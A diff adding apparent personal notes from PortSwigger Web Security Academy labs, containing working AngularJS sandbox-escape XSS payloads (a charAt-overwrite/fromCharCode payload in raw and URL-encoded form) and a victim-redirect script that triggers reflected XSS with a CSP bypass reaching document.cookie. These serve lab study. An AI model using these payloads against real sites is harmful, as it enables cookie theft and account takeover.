@@ -129,6 +129,34 @@ var message = `0 search results for 'test123'`;
 // leverage template expression to inject xss
 ${alert(1)}
 
+===
+
+// payload:
+// this is raw. make sure to url encode...
+https://0a99003404c0d51780adb77c00cd0044.web-security-academy.net/?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+
+// This one's a bit complicated. I somewhat understood the tldr.
+// But I'm just going to copy pasta the explanation from portswigger:
+
+The exploit uses toString() to create a string without using quotes. It then gets the String prototype and overwrites the charAt function for every string. This effectively breaks the AngularJS sandbox. Next, an array is passed to the orderBy filter. We then set the argument for the filter by again using toString() to create a string and the String constructor property. Finally, we use the fromCharCode method generate our payload by converting character codes into the string x=alert(1). Because the charAt function has been overwritten, AngularJS will allow this code where normally it would not. 
+
+// url encoded (only certain chars...):
+https://0a99003404c0d51780adb77c00cd0044.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+
+===
+
+Reflected XSS with AngularJS sandbox escape and CSP
+
+// host the following on your infra.
+// link the victim to your page.
+<script>
+location='https://0a820017045f9aff8069535900db006c.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
+</script>
+
+// here's what it looks like with no url encoding:
+<script>
+location='https://0a820017045f9aff8069535900db006c.web-security-academy.net/?search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';
+</script>
 
 
 
